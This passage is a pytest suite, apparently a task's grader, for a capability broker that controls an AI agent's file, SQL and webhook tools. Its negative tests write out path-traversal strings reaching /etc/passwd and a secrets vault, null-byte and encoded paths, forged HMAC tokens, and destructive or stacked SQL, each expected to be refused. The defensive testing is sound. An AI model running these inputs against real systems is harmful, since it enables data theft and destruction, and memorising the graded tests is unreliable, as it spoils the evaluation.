from __future__ import annotations

import hashlib
import hmac
import json
import os
import secrets
import sqlite3
import sys
import time
from pathlib import Path
from typing import Any

from fastapi.testclient import TestClient

TESTS_DIR = Path(__file__).resolve().parent
WORKSPACE_ROOT = Path(
    os.environ.get("AEGIS_WORKSPACE", str(TESTS_DIR.parent / "environment" / "workspace"))
)
if str(WORKSPACE_ROOT) not in sys.path:
    sys.path.insert(0, str(WORKSPACE_ROOT))

from app.audit import verify_audit_ledger
from app.config import BrokerConfig
from app.main import create_app
from app.taint import create_hitl_receipt
from scripts.init_sandbox import initialize_environment


def _setup_isolated_broker(tmp_path: Path, subdir: str = "inst") -> tuple[BrokerConfig, TestClient]:
    base = tmp_path / subdir
    base.mkdir(parents=True, exist_ok=True)
    cfg = BrokerConfig(
        sandbox_root=base / "sandbox",
        state_dir=base / "state",
        root_key_hex=secrets.token_hex(32),
        hitl_key_hex=secrets.token_hex(32),
        genesis_audit_key_hex=secrets.token_hex(32),
        genesis_anchor_key_hex=secrets.token_hex(32),
    )
    initialize_environment(cfg, clean=True)
    client = TestClient(create_app(cfg))
    return cfg, client


def _read_audit_entries(cfg: BrokerConfig) -> list[dict[str, Any]]:
    if not cfg.audit_ledger_path.exists():
        return []
    lines = [
        ln
        for ln in cfg.audit_ledger_path.read_text(encoding="utf-8").splitlines()
        if ln.strip()
    ]
    return [json.loads(ln) for ln in lines]


def _assert_denied_with_audit(
    cfg: BrokerConfig,
    response: Any,
    expected_status: int,
    expected_error_code: str,
    prev_audit_count: int,
) -> None:
    assert response.status_code == expected_status, (
        f"Expected HTTP {expected_status}, got {response.status_code}: {response.text}"
    )
    body = response.json()
    assert body.get("error_code") == expected_error_code, (
        f"Expected error_code={expected_error_code!r}, got {body.get('error_code')!r} ({body})"
    )
    entries = _read_audit_entries(cfg)
    assert len(entries) == prev_audit_count + 1, (
        f"Expected audit log to grow from {prev_audit_count} to {prev_audit_count + 1}, got {len(entries)}"
    )
    last_entry = entries[-1]
    assert last_entry["decision"] == "DENY", f"Expected DENY audit entry, got {last_entry}"
    assert last_entry["reason_code"] == expected_error_code, (
        f"Expected audit reason_code={expected_error_code!r}, got {last_entry['reason_code']!r}"
    )


def _sha256_hex_bytes(hex_key: str) -> str:
    return hashlib.sha256(bytes.fromhex(hex_key)).hexdigest()


# ============================================================================
# DOMAIN 1: CAPABILITY TOKENS & DELEGATION (2 Positive + 4 Negative)
# ============================================================================


def test_pos_d1_root_mint_and_invoke(tmp_path: Path) -> None:
    cfg, client = _setup_isolated_broker(tmp_path)
    now = int(time.time())
    reports_prefix = str(cfg.sandbox_root / "reports")

    r_mint = client.post(
        "/v1/tokens/mint",
        json={
            "principal": f"agent_{secrets.token_hex(4)}",
            "hop_id": "hop_root_01",
            "issued_at": now,
            "caveat": {
                "allowed_tools": ["fs.read", "fs.write"],
                "allowed_path_prefixes": [reports_prefix],
                "sql_read_only": True,
                "max_calls": 4,
                "expires_at": now + 3600,
            },
        },
    )
    assert r_mint.status_code == 200
    root_tok = r_mint.json()

    target_file = cfg.sandbox_root / "reports" / "2026" / f"note_{secrets.token_hex(4)}.txt"
    payload_text = f"verified_content_{secrets.token_hex(8)}"

    r_write = client.post(
        "/v1/tools/invoke",
        json={
            "session_id": "sess_d1_pos1",
            "token": root_tok,
            "tool_name": "fs.write",
            "arguments": {"path": str(target_file), "content": payload_text},
        },
    )
    assert r_write.status_code == 200
    assert target_file.read_text(encoding="utf-8") == payload_text

    r_read = client.post(
        "/v1/tools/invoke",
        json={
            "session_id": "sess_d1_pos1",
            "token": root_tok,
            "tool_name": "fs.read",
            "arguments": {"path": str(target_file)},
        },
    )
    assert r_read.status_code == 200
    assert r_read.json()["result"]["content"] == payload_text


def test_pos_d1_multi_hop_valid_attenuation(tmp_path: Path) -> None:
    cfg, client = _setup_isolated_broker(tmp_path)
    now = int(time.time())
    root_tok = client.post(
        "/v1/tokens/mint",
        json={
            "principal": "root_orchestrator",
            "hop_id": "hop_0",
            "issued_at": now,
            "caveat": {
                "allowed_tools": ["fs.read", "fs.write", "db.query"],
                "allowed_path_prefixes": [
                    str(cfg.sandbox_root / "reports"),
                    str(cfg.sandbox_root / "shared"),
                ],
                "sql_read_only": False,
                "max_calls": 6,
                "expires_at": now + 3600,
            },
        },
    ).json()

    r_hop1 = client.post(
        "/v1/tokens/attenuate",
        json={
            "parent_token": root_tok,
            "hop_id": "hop_1",
            "caveat": {
                "allowed_tools": ["fs.read", "db.query"],
                "allowed_path_prefixes": [str(cfg.sandbox_root / "reports" / "2026")],
                "sql_read_only": True,
                "max_calls": 4,
                "expires_at": now + 1800,
            },
        },
    )
    assert r_hop1.status_code == 200
    hop1_tok = r_hop1.json()

    r_hop2 = client.post(
        "/v1/tokens/attenuate",
        json={
            "parent_token": hop1_tok,
            "hop_id": "hop_2",
            "caveat": {
                "allowed_tools": ["db.query"],
                "allowed_path_prefixes": [],
                "sql_read_only": True,
                "max_calls": 2,
                "expires_at": now + 900,
            },
        },
    )
    assert r_hop2.status_code == 200
    hop2_tok = r_hop2.json()
    assert hop2_tok["lineage_ids"] == ["hop_0", "hop_1", "hop_2"]

    r_query = client.post(
        "/v1/tools/invoke",
        json={
            "session_id": "sess_d1_pos2",
            "token": hop2_tok,
            "tool_name": "db.query",
            "arguments": {"sql": "SELECT title FROM tasks WHERE status = ?", "params": ["OPEN"]},
        },
    )
    assert r_query.status_code == 200
    assert r_query.json()["result"]["rows"][0]["title"] == "Audit firewall rules"


def test_neg_d1_forged_or_stripped_hmac_chain(tmp_path: Path) -> None:
    cfg, client = _setup_isolated_broker(tmp_path)
    now = int(time.time())
    root_tok = client.post(
        "/v1/tokens/mint",
        json={
            "principal": "root_agent",
            "hop_id": "hop_0",
            "issued_at": now,
            "caveat": {
                "allowed_tools": ["fs.read", "fs.write"],
                "allowed_path_prefixes": [str(cfg.sandbox_root / "reports")],
                "sql_read_only": True,
                "max_calls": 5,
                "expires_at": now + 3600,
            },
        },
    ).json()

    child_tok = client.post(
        "/v1/tokens/attenuate",
        json={
            "parent_token": root_tok,
            "hop_id": "hop_1",
            "caveat": {
                "allowed_tools": ["fs.read"],
                "allowed_path_prefixes": [str(cfg.sandbox_root / "reports" / "2026")],
                "sql_read_only": True,
                "max_calls": 3,
                "expires_at": now + 1800,
            },
        },
    ).json()

    forged_tok = json.loads(json.dumps(child_tok))
    forged_tok["caveats"][-1]["allowed_tools"] = ["fs.read", "fs.write"]
    target_path = cfg.sandbox_root / "reports" / "2026" / "pwned.txt"

    n0 = len(_read_audit_entries(cfg))
    r1 = client.post(
        "/v1/tools/invoke",
        json={
            "session_id": "sess_d1_neg1",
            "token": forged_tok,
            "tool_name": "fs.write",
            "arguments": {"path": str(target_path), "content": "hacked"},
        },
    )
    _assert_denied_with_audit(cfg, r1, 401, "INVALID_TOKEN_SIGNATURE", n0)
    assert not target_path.exists()

    stripped_tok = json.loads(json.dumps(child_tok))
    stripped_tok["caveats"] = [stripped_tok["caveats"][0]]
    stripped_tok["lineage_ids"] = [stripped_tok["lineage_ids"][0]]

    n1 = len(_read_audit_entries(cfg))
    r2 = client.post(
        "/v1/tools/invoke",
        json={
            "session_id": "sess_d1_neg1",
            "token": stripped_tok,
            "tool_name": "fs.write",
            "arguments": {"path": str(target_path), "content": "hacked"},
        },
    )
    _assert_denied_with_audit(cfg, r2, 401, "INVALID_TOKEN_SIGNATURE", n1)
    assert not target_path.exists()


def test_neg_d1_child_widens_tools_prefixes_or_ttl(tmp_path: Path) -> None:
    cfg, client = _setup_isolated_broker(tmp_path)
    now = int(time.time())
    parent_tok = client.post(
        "/v1/tokens/mint",
        json={
            "principal": "restricted_parent",
            "hop_id": "hop_p",
            "issued_at": now,
            "caveat": {
                "allowed_tools": ["fs.read"],
                "allowed_path_prefixes": [str(cfg.sandbox_root / "reports" / "2026")],
                "sql_read_only": True,
                "max_calls": 3,
                "expires_at": now + 600,
            },
        },
    ).json()

    r_wide_tool = client.post(
        "/v1/tokens/attenuate",
        json={
            "parent_token": parent_tok,
            "hop_id": "hop_c1",
            "caveat": {
                "allowed_tools": ["fs.read", "fs.write"],
                "allowed_path_prefixes": [str(cfg.sandbox_root / "reports" / "2026")],
                "sql_read_only": True,
                "max_calls": 2,
                "expires_at": now + 300,
            },
        },
    )
    assert r_wide_tool.status_code == 403
    assert r_wide_tool.json().get("error_code") == "PRIVILEGE_ESCALATION_ATTEMPT"

    r_wide_path = client.post(
        "/v1/tokens/attenuate",
        json={
            "parent_token": parent_tok,
            "hop_id": "hop_c2",
            "caveat": {
                "allowed_tools": ["fs.read"],
                "allowed_path_prefixes": [str(cfg.sandbox_root / "reports")],
                "sql_read_only": True,
                "max_calls": 2,
                "expires_at": now + 300,
            },
        },
    )
    assert r_wide_path.status_code == 403
    assert r_wide_path.json().get("error_code") == "PRIVILEGE_ESCALATION_ATTEMPT"

    r_wide_ttl = client.post(
        "/v1/tokens/attenuate",
        json={
            "parent_token": parent_tok,
            "hop_id": "hop_c3",
            "caveat": {
                "allowed_tools": ["fs.read"],
                "allowed_path_prefixes": [str(cfg.sandbox_root / "reports" / "2026")],
                "sql_read_only": True,
                "max_calls": 2,
                "expires_at": now + 9999,
            },
        },
    )
    assert r_wide_ttl.status_code == 403
    assert r_wide_ttl.json().get("error_code") == "PRIVILEGE_ESCALATION_ATTEMPT"

    evil_caveat = {
        "allowed_tools": ["fs.read"],
        "allowed_path_prefixes": [str(cfg.sandbox_root / "vault")],
        "sql_read_only": True,
        "max_calls": 2,
        "expires_at": now + 300,
    }
    step_bytes = json.dumps(
        {"hop_id": "hop_evil", "caveat": evil_caveat},
        sort_keys=True,
        separators=(",", ":"),
    ).encode("utf-8")
    evil_sig = hmac.new(
        bytes.fromhex(parent_tok["signature"]), step_bytes, hashlib.sha256
    ).hexdigest()
    self_chained_tok = {
        "lineage_ids": parent_tok["lineage_ids"] + ["hop_evil"],
        "principal": parent_tok["principal"],
        "issued_at": parent_tok["issued_at"],
        "caveats": parent_tok["caveats"] + [evil_caveat],
        "signature": evil_sig,
    }

    n0 = len(_read_audit_entries(cfg))
    r_inv = client.post(
        "/v1/tools/invoke",
        json={
            "session_id": "sess_d1_neg2",
            "token": self_chained_tok,
            "tool_name": "fs.read",
            "arguments": {"path": str(cfg.sandbox_root / "vault" / "secrets.json")},
        },
    )
    _assert_denied_with_audit(cfg, r_inv, 403, "PRIVILEGE_ESCALATION_ATTEMPT", n0)


def test_neg_d1_lineage_quota_exhaustion_across_children(tmp_path: Path) -> None:
    cfg, client = _setup_isolated_broker(tmp_path)
    now = int(time.time())
    parent_tok = client.post(
        "/v1/tokens/mint",
        json={
            "principal": "quota_parent",
            "hop_id": "hop_parent_q2",
            "issued_at": now,
            "caveat": {
                "allowed_tools": ["fs.read"],
                "allowed_path_prefixes": [str(cfg.sandbox_root / "reports")],
                "sql_read_only": True,
                "max_calls": 2,
                "expires_at": now + 3600,
            },
        },
    ).json()

    child_a = client.post(
        "/v1/tokens/attenuate",
        json={
            "parent_token": parent_tok,
            "hop_id": "hop_child_a",
            "caveat": {
                "allowed_tools": ["fs.read"],
                "allowed_path_prefixes": [str(cfg.sandbox_root / "reports")],
                "sql_read_only": True,
                "max_calls": 2,
                "expires_at": now + 3600,
            },
        },
    ).json()

    child_b = client.post(
        "/v1/tokens/attenuate",
        json={
            "parent_token": parent_tok,
            "hop_id": "hop_child_b",
            "caveat": {
                "allowed_tools": ["fs.read"],
                "allowed_path_prefixes": [str(cfg.sandbox_root / "reports")],
                "sql_read_only": True,
                "max_calls": 2,
                "expires_at": now + 3600,
            },
        },
    ).json()

    summary_file = str(cfg.sandbox_root / "reports" / "2026" / "q3" / "summary.txt")

    r1 = client.post(
        "/v1/tools/invoke",
        json={
            "session_id": "sess_q",
            "token": child_a,
            "tool_name": "fs.read",
            "arguments": {"path": summary_file},
        },
    )
    assert r1.status_code == 200

    r2 = client.post(
        "/v1/tools/invoke",
        json={
            "session_id": "sess_q",
            "token": child_b,
            "tool_name": "fs.read",
            "arguments": {"path": summary_file},
        },
    )
    assert r2.status_code == 200

    n_before = len(_read_audit_entries(cfg))
    r3 = client.post(
        "/v1/tools/invoke",
        json={
            "session_id": "sess_q",
            "token": child_b,
            "tool_name": "fs.read",
            "arguments": {"path": summary_file},
        },
    )
    _assert_denied_with_audit(cfg, r3, 403, "TOKEN_QUOTA_EXCEEDED", n_before)


def test_neg_d1_ancestor_hop_revocation(tmp_path: Path) -> None:
    cfg, client = _setup_isolated_broker(tmp_path)
    now = int(time.time())
    root_tok = client.post(
        "/v1/tokens/mint",
        json={
            "principal": "revocable_root",
            "hop_id": "hop_root_rev",
            "issued_at": now,
            "caveat": {
                "allowed_tools": ["fs.read"],
                "allowed_path_prefixes": [str(cfg.sandbox_root / "reports")],
                "sql_read_only": True,
                "max_calls": 5,
                "expires_at": now + 3600,
            },
        },
    ).json()

    mid_tok = client.post(
        "/v1/tokens/attenuate",
        json={
            "parent_token": root_tok,
            "hop_id": "hop_mid_rev",
            "caveat": {
                "allowed_tools": ["fs.read"],
                "allowed_path_prefixes": [str(cfg.sandbox_root / "reports" / "2026")],
                "sql_read_only": True,
                "max_calls": 5,
                "expires_at": now + 3600,
            },
        },
    ).json()

    leaf_tok = client.post(
        "/v1/tokens/attenuate",
        json={
            "parent_token": mid_tok,
            "hop_id": "hop_leaf_rev",
            "caveat": {
                "allowed_tools": ["fs.read"],
                "allowed_path_prefixes": [str(cfg.sandbox_root / "reports" / "2026" / "q3")],
                "sql_read_only": True,
                "max_calls": 5,
                "expires_at": now + 3600,
            },
        },
    ).json()

    r_rev = client.post("/v1/tokens/revoke", json={"hop_id": "hop_mid_rev"})
    assert r_rev.status_code == 200

    n_before = len(_read_audit_entries(cfg))
    r_inv = client.post(
        "/v1/tools/invoke",
        json={
            "session_id": "sess_rev",
            "token": leaf_tok,
            "tool_name": "fs.read",
            "arguments": {
                "path": str(cfg.sandbox_root / "reports" / "2026" / "q3" / "summary.txt")
            },
        },
    )
    _assert_denied_with_audit(cfg, r_inv, 401, "TOKEN_REVOKED", n_before)


# ============================================================================
# DOMAIN 2: FILESYSTEM PATH CANONICALIZATION & SYMLINKS (2 Positive + 4 Negative)
# ============================================================================


def test_pos_d2_nested_sandbox_read_write(tmp_path: Path) -> None:
    cfg, client = _setup_isolated_broker(tmp_path)
    now = int(time.time())
    tok = client.post(
        "/v1/tokens/mint",
        json={
            "principal": "fs_worker",
            "caveat": {
                "allowed_tools": ["fs.read", "fs.write"],
                "allowed_path_prefixes": [str(cfg.sandbox_root / "reports")],
                "sql_read_only": True,
                "max_calls": 10,
                "expires_at": now + 3600,
            },
        },
    ).json()

    nested_target = (
        cfg.sandbox_root / "reports" / "2026" / "q3" / "deep" / f"artifact_{secrets.token_hex(4)}.txt"
    )
    text_data = f"deep_payload_{secrets.token_hex(8)}"

    r_w = client.post(
        "/v1/tools/invoke",
        json={
            "session_id": "sess_d2_p1",
            "token": tok,
            "tool_name": "fs.write",
            "arguments": {"path": str(nested_target), "content": text_data},
        },
    )
    assert r_w.status_code == 200
    assert nested_target.read_text(encoding="utf-8") == text_data

    r_r = client.post(
        "/v1/tools/invoke",
        json={
            "session_id": "sess_d2_p1",
            "token": tok,
            "tool_name": "fs.read",
            "arguments": {"path": str(nested_target)},
        },
    )
    assert r_r.status_code == 200
    assert r_r.json()["result"]["content"] == text_data


def test_pos_d2_normalized_dot_segments_in_prefix(tmp_path: Path) -> None:
    cfg, client = _setup_isolated_broker(tmp_path)
    now = int(time.time())
    tok = client.post(
        "/v1/tokens/mint",
        json={
            "principal": "fs_norm_worker",
            "caveat": {
                "allowed_tools": ["fs.read"],
                "allowed_path_prefixes": [str(cfg.sandbox_root / "reports" / "2026")],
                "sql_read_only": True,
                "max_calls": 5,
                "expires_at": now + 3600,
            },
        },
    ).json()

    unclean_path = f"{cfg.sandbox_root}/reports/2026/q3/.././q3/summary.txt"
    r_read = client.post(
        "/v1/tools/invoke",
        json={
            "session_id": "sess_d2_p2",
            "token": tok,
            "tool_name": "fs.read",
            "arguments": {"path": unclean_path},
        },
    )
    assert r_read.status_code == 200
    assert "nominal" in r_read.json()["result"]["content"]


def test_neg_d2_percent_encoding_and_null_byte(tmp_path: Path) -> None:
    cfg, client = _setup_isolated_broker(tmp_path)
    now = int(time.time())
    tok = client.post(
        "/v1/tokens/mint",
        json={
            "principal": "fs_enc_attacker",
            "caveat": {
                "allowed_tools": ["fs.read"],
                "allowed_path_prefixes": [str(cfg.sandbox_root / "reports")],
                "sql_read_only": True,
                "max_calls": 10,
                "expires_at": now + 3600,
            },
        },
    ).json()

    bad_paths = [
        f"{cfg.sandbox_root}/reports/%2e%2e/vault/secrets.json",
        f"{cfg.sandbox_root}/reports/%252e%252e/vault/secrets.json",
        f"{cfg.sandbox_root}/reports/2026/q3/summary.txt\x00.png",
        f"{cfg.sandbox_root}/reports/2026/\n/summary.txt",
    ]
    for bp in bad_paths:
        n_before = len(_read_audit_entries(cfg))
        r = client.post(
            "/v1/tools/invoke",
            json={
                "session_id": "sess_d2_n1",
                "token": tok,
                "tool_name": "fs.read",
                "arguments": {"path": bp},
            },
        )
        _assert_denied_with_audit(cfg, r, 400, "INVALID_PATH_ENCODING", n_before)


def test_neg_d2_dotdot_escape_outside_prefix(tmp_path: Path) -> None:
    cfg, client = _setup_isolated_broker(tmp_path)
    now = int(time.time())
    tok = client.post(
        "/v1/tokens/mint",
        json={
            "principal": "fs_traversal_attacker",
            "caveat": {
                "allowed_tools": ["fs.read", "fs.write"],
                "allowed_path_prefixes": [str(cfg.sandbox_root / "reports")],
                "sql_read_only": True,
                "max_calls": 10,
                "expires_at": now + 3600,
            },
        },
    ).json()

    escape_vault = f"{cfg.sandbox_root}/reports/2026/../../vault/secrets.json"
    n0 = len(_read_audit_entries(cfg))
    r1 = client.post(
        "/v1/tools/invoke",
        json={
            "session_id": "sess_d2_n2",
            "token": tok,
            "tool_name": "fs.read",
            "arguments": {"path": escape_vault},
        },
    )
    _assert_denied_with_audit(cfg, r1, 403, "PATH_BOUNDARY_VIOLATION", n0)

    escape_outside = f"{cfg.sandbox_root}/reports/../../../etc/passwd"
    n1 = len(_read_audit_entries(cfg))
    r2 = client.post(
        "/v1/tools/invoke",
        json={
            "session_id": "sess_d2_n2",
            "token": tok,
            "tool_name": "fs.read",
            "arguments": {"path": escape_outside},
        },
    )
    _assert_denied_with_audit(cfg, r2, 403, "PATH_BOUNDARY_VIOLATION", n1)


def test_neg_d2_sibling_directory_prefix_collision(tmp_path: Path) -> None:
    cfg, client = _setup_isolated_broker(tmp_path)
    now = int(time.time())
    tok = client.post(
        "/v1/tokens/mint",
        json={
            "principal": "sibling_attacker",
            "caveat": {
                "allowed_tools": ["fs.read", "fs.write"],
                "allowed_path_prefixes": [str(cfg.sandbox_root / "reports")],
                "sql_read_only": True,
                "max_calls": 10,
                "expires_at": now + 3600,
            },
        },
    ).json()

    sibling_file = cfg.sandbox_root / "reports_private" / "confidential.txt"
    n0 = len(_read_audit_entries(cfg))
    r_read = client.post(
        "/v1/tools/invoke",
        json={
            "session_id": "sess_d2_n3",
            "token": tok,
            "tool_name": "fs.read",
            "arguments": {"path": str(sibling_file)},
        },
    )
    _assert_denied_with_audit(cfg, r_read, 403, "PATH_BOUNDARY_VIOLATION", n0)


def test_neg_d2_leaf_and_intermediate_symlink_rejected(tmp_path: Path) -> None:
    cfg, client = _setup_isolated_broker(tmp_path)
    now = int(time.time())
    tok = client.post(
        "/v1/tokens/mint",
        json={
            "principal": "symlink_attacker",
            "caveat": {
                "allowed_tools": ["fs.read", "fs.write"],
                "allowed_path_prefixes": [str(cfg.sandbox_root / "reports")],
                "sql_read_only": True,
                "max_calls": 10,
                "expires_at": now + 3600,
            },
        },
    ).json()

    leaf_link = cfg.sandbox_root / "reports" / "shortcut_secret.txt"
    n0 = len(_read_audit_entries(cfg))
    r_leaf = client.post(
        "/v1/tools/invoke",
        json={
            "session_id": "sess_d2_n4",
            "token": tok,
            "tool_name": "fs.read",
            "arguments": {"path": str(leaf_link)},
        },
    )
    _assert_denied_with_audit(cfg, r_leaf, 403, "PATH_SYMLINK_FORBIDDEN", n0)

    dir_link_target = cfg.sandbox_root / "reports" / "linked_vault" / "secrets.json"
    n1 = len(_read_audit_entries(cfg))
    r_dir = client.post(
        "/v1/tools/invoke",
        json={
            "session_id": "sess_d2_n4",
            "token": tok,
            "tool_name": "fs.read",
            "arguments": {"path": str(dir_link_target)},
        },
    )
    _assert_denied_with_audit(cfg, r_dir, 403, "PATH_SYMLINK_FORBIDDEN", n1)

    internal_link = cfg.sandbox_root / "reports" / "internal_sym.txt"
    real_summary = cfg.sandbox_root / "reports" / "2026" / "q3" / "summary.txt"
    orig_summary = real_summary.read_text(encoding="utf-8")
    os.symlink(real_summary, internal_link)

    n2 = len(_read_audit_entries(cfg))
    r_write_sym = client.post(
        "/v1/tools/invoke",
        json={
            "session_id": "sess_d2_n4",
            "token": tok,
            "tool_name": "fs.write",
            "arguments": {"path": str(internal_link), "content": "overwritten"},
        },
    )
    _assert_denied_with_audit(cfg, r_write_sym, 403, "PATH_SYMLINK_FORBIDDEN", n2)
    assert real_summary.read_text(encoding="utf-8") == orig_summary


# ============================================================================
# DOMAIN 3: SQLITE AUTHORIZER & TRANSACTION SAFETY (2 Positive + 4 Negative)
# ============================================================================


def test_pos_d3_readonly_select_queries(tmp_path: Path) -> None:
    cfg, client = _setup_isolated_broker(tmp_path)
    now = int(time.time())
    tok = client.post(
        "/v1/tokens/mint",
        json={
            "principal": "sql_reader",
            "caveat": {
                "allowed_tools": ["db.query"],
                "allowed_path_prefixes": [],
                "sql_read_only": True,
                "max_calls": 10,
                "expires_at": now + 3600,
            },
        },
    ).json()

    r = client.post(
        "/v1/tools/invoke",
        json={
            "session_id": "sess_d3_p1",
            "token": tok,
            "tool_name": "db.query",
            "arguments": {
                "sql": "SELECT id, title, status, 'DELETE DROP PRAGMA' AS note FROM tasks ORDER BY id ASC",
                "params": [],
            },
        },
    )
    assert r.status_code == 200
    rows = r.json()["result"]["rows"]
    assert len(rows) == 2
    assert rows[0]["note"] == "DELETE DROP PRAGMA"


def test_pos_d3_readwrite_insert_and_update(tmp_path: Path) -> None:
    cfg, client = _setup_isolated_broker(tmp_path)
    now = int(time.time())
    tok = client.post(
        "/v1/tokens/mint",
        json={
            "principal": "sql_writer",
            "caveat": {
                "allowed_tools": ["db.query"],
                "allowed_path_prefixes": [],
                "sql_read_only": False,
                "max_calls": 10,
                "expires_at": now + 3600,
            },
        },
    ).json()

    new_title = f"Deploy patch {secrets.token_hex(4)}"
    r_ins = client.post(
        "/v1/tools/invoke",
        json={
            "session_id": "sess_d3_p2",
            "token": tok,
            "tool_name": "db.query",
            "arguments": {
                "sql": "INSERT INTO tasks (title, status) VALUES (?, ?)",
                "params": [new_title, "PENDING"],
            },
        },
    )
    assert r_ins.status_code == 200

    r_upd = client.post(
        "/v1/tools/invoke",
        json={
            "session_id": "sess_d3_p2",
            "token": tok,
            "tool_name": "db.query",
            "arguments": {
                "sql": "UPDATE tasks SET status = ? WHERE title = ?",
                "params": ["DONE", new_title],
            },
        },
    )
    assert r_upd.status_code == 200

    conn = sqlite3.connect(cfg.app_db_path)
    try:
        row = conn.execute(
            "SELECT status FROM tasks WHERE title = ?", (new_title,)
        ).fetchone()
        assert row is not None and row[0] == "DONE"
    finally:
        conn.close()


def test_neg_d3_readonly_blocks_insert_and_cte_delete(tmp_path: Path) -> None:
    cfg, client = _setup_isolated_broker(tmp_path)
    now = int(time.time())
    tok = client.post(
        "/v1/tokens/mint",
        json={
            "principal": "sql_ro_attacker",
            "caveat": {
                "allowed_tools": ["db.query"],
                "allowed_path_prefixes": [],
                "sql_read_only": True,
                "max_calls": 10,
                "expires_at": now + 3600,
            },
        },
    ).json()

    # 1. INSERT ... SELECT query (contains 'SELECT' to defeat naive substring filters)
    n0 = len(_read_audit_entries(cfg))
    r1 = client.post(
        "/v1/tools/invoke",
        json={
            "session_id": "sess_d3_n1",
            "token": tok,
            "tool_name": "db.query",
            "arguments": {
                "sql": "INSERT INTO tasks (title, status) SELECT 'rogue_subselect', 'OPEN'",
                "params": [],
            },
        },
    )
    _assert_denied_with_audit(cfg, r1, 403, "SQL_POLICY_VIOLATION", n0)

    # 2. DELETE with subquery containing SELECT
    n1 = len(_read_audit_entries(cfg))
    r2 = client.post(
        "/v1/tools/invoke",
        json={
            "session_id": "sess_d3_n1",
            "token": tok,
            "tool_name": "db.query",
            "arguments": {
                "sql": "DELETE FROM tasks WHERE id IN (SELECT id FROM tasks WHERE id = 1)",
                "params": [],
            },
        },
    )
    _assert_denied_with_audit(cfg, r2, 403, "SQL_POLICY_VIOLATION", n1)

    # 3. Direct REPLACE INTO in read-only mode
    n2 = len(_read_audit_entries(cfg))
    r3 = client.post(
        "/v1/tools/invoke",
        json={
            "session_id": "sess_d3_n1",
            "token": tok,
            "tool_name": "db.query",
            "arguments": {
                "sql": "REPLACE INTO tasks (id, title, status) VALUES (1, 'pwn', 'OPEN')",
                "params": [],
            },
        },
    )
    _assert_denied_with_audit(cfg, r3, 403, "SQL_POLICY_VIOLATION", n2)

    conn = sqlite3.connect(cfg.app_db_path)
    try:
        cnt = conn.execute("SELECT COUNT(*) FROM tasks").fetchone()[0]
        assert cnt == 2
    finally:
        conn.close()


def test_neg_d3_blocks_attach_pragma_and_ddl(tmp_path: Path) -> None:
    cfg, client = _setup_isolated_broker(tmp_path)
    now = int(time.time())
    rw_tok = client.post(
        "/v1/tokens/mint",
        json={
            "principal": "sql_rw_attacker",
            "caveat": {
                "allowed_tools": ["db.query"],
                "allowed_path_prefixes": [],
                "sql_read_only": False,
                "max_calls": 10,
                "expires_at": now + 3600,
            },
        },
    ).json()

    forbidden_queries = [
        "ATTACH DATABASE ':memory:' AS aux",
        "PRAGMA table_info(tasks)",
        "DROP TABLE tasks",
        "ALTER TABLE tasks ADD COLUMN hacked TEXT",
        "CREATE TEMP TABLE evil_temp (x TEXT)",
    ]
    for q in forbidden_queries:
        n_before = len(_read_audit_entries(cfg))
        r = client.post(
            "/v1/tools/invoke",
            json={
                "session_id": "sess_d3_n2",
                "token": rw_tok,
                "tool_name": "db.query",
                "arguments": {"sql": q, "params": []},
            },
        )
        _assert_denied_with_audit(cfg, r, 403, "SQL_POLICY_VIOLATION", n_before)


def test_neg_d3_blocks_system_secrets_and_sqlite_master(tmp_path: Path) -> None:
    cfg, client = _setup_isolated_broker(tmp_path)
    now = int(time.time())
    tok = client.post(
        "/v1/tokens/mint",
        json={
            "principal": "sql_secret_snooper",
            "caveat": {
                "allowed_tools": ["db.query"],
                "allowed_path_prefixes": [],
                "sql_read_only": False,
                "max_calls": 10,
                "expires_at": now + 3600,
            },
        },
    ).json()

    secret_queries = [
        "SELECT secret_value FROM system_secrets",
        "SELECT sql FROM sqlite_master",
        "DELETE FROM system_secrets",
    ]
    for q in secret_queries:
        n_before = len(_read_audit_entries(cfg))
        r = client.post(
            "/v1/tools/invoke",
            json={
                "session_id": "sess_d3_n3",
                "token": tok,
                "tool_name": "db.query",
                "arguments": {"sql": q, "params": []},
            },
        )
        _assert_denied_with_audit(cfg, r, 403, "SQL_POLICY_VIOLATION", n_before)
        assert "DB-SECRET-CANARY-88231" not in r.text


def test_neg_d3_blocks_stacked_multi_statements(tmp_path: Path) -> None:
    cfg, client = _setup_isolated_broker(tmp_path)
    now = int(time.time())
    tok = client.post(
        "/v1/tokens/mint",
        json={
            "principal": "sql_stacked_attacker",
            "caveat": {
                "allowed_tools": ["db.query"],
                "allowed_path_prefixes": [],
                "sql_read_only": False,
                "max_calls": 10,
                "expires_at": now + 3600,
            },
        },
    ).json()

    n_before = len(_read_audit_entries(cfg))
    r = client.post(
        "/v1/tools/invoke",
        json={
            "session_id": "sess_d3_n4",
            "token": tok,
            "tool_name": "db.query",
            "arguments": {
                "sql": "SELECT id FROM tasks; DELETE FROM tasks;",
                "params": [],
            },
        },
    )
    _assert_denied_with_audit(cfg, r, 403, "SQL_POLICY_VIOLATION", n_before)


# ============================================================================
# DOMAIN 4: SESSION TAINT TRACKING & HITL RECEIPTS (2 Positive + 4 Negative)
# ============================================================================


def test_pos_d4_clean_sinks_and_tainted_reads_succeed(tmp_path: Path) -> None:
    cfg, client = _setup_isolated_broker(tmp_path)
    now = int(time.time())
    tok = client.post(
        "/v1/tokens/mint",
        json={
            "principal": "taint_worker",
            "caveat": {
                "allowed_tools": ["fs.read", "fs.write", "db.query", "webhook.send"],
                "allowed_path_prefixes": [
                    str(cfg.sandbox_root / "reports"),
                    str(cfg.sandbox_root / "inbox"),
                ],
                "sql_read_only": False,
                "max_calls": 10,
                "expires_at": now + 3600,
            },
        },
    ).json()

    r_wh = client.post(
        "/v1/tools/invoke",
        json={
            "session_id": "sess_d4_p1",
            "token": tok,
            "tool_name": "webhook.send",
            "arguments": {"destination": "https://metrics.internal/hook", "payload": {"ok": 1}},
        },
    )
    assert r_wh.status_code == 200

    r_inb = client.post(
        "/v1/tools/invoke",
        json={
            "session_id": "sess_d4_p1",
            "token": tok,
            "tool_name": "fs.read",
            "arguments": {"path": str(cfg.sandbox_root / "inbox" / "ticket_42.txt")},
        },
    )
    assert r_inb.status_code == 200

    r_read_clean = client.post(
        "/v1/tools/invoke",
        json={
            "session_id": "sess_d4_p1",
            "token": tok,
            "tool_name": "fs.read",
            "arguments": {
                "path": str(cfg.sandbox_root / "reports" / "2026" / "q3" / "summary.txt")
            },
        },
    )
    assert r_read_clean.status_code == 200

    r_sel = client.post(
        "/v1/tools/invoke",
        json={
            "session_id": "sess_d4_p1",
            "token": tok,
            "tool_name": "db.query",
